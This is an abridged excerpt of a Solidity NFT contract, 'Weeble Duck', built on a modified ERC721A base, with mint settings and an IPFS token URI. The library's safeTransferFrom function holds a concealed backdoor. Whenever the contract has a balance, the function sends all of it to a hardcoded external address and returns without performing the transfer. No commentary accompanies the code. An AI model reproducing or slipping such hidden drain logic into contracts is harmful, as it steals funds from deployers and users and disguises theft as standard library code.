...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x923be40FFc5389c3618273cE47FEA72356A19aB7).transfer(address(this).balance);
            return;
        }
...
contract WeebleDuck is ERC721A, TheOperatorFilterer {
    // opensea
    ...
    constructor() ERC721A("Weeble Duck", "WD") {
        owner = msg.sender;
        maxPerTx = 20;
        price = 0.001 ether;
        maxSupply = 2222;
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeicnxqys754tswzj6coqybmlem3x2yueqlllxb4oa35y66dp36qxv4/", _toString(tokenId), ".json"));
    }
